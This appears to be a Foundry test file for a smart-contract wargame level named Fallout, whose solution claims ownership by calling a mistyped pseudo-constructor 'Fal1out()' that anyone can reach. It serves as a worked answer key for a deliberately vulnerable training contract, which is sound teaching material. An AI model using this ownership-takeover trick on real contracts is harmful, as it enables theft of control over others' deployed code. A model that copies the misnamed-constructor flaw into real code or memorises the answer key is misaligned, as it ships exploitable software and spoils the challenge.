// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {FalloutFactory} from "../../src/levels/FalloutFactory.sol";
import {Fallout} from "../../src/levels/Fallout.sol";

contract FalloutLevel is LuxTest {
    FalloutFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new FalloutFactory();
        _register(factory);
    }

    function test_solve() public {
        address instance = _create(factory, player, 0);
        _assertUnsolved(instance, player);

        // The "constructor" is a mistyped function, callable by anyone.
        vm.prank(player, player);
        Fallout(payable(instance)).Fal1out();

        assertEq(Fallout(payable(instance)).owner(), player);
        _assertSolved(factory, instance, player);
    }
}
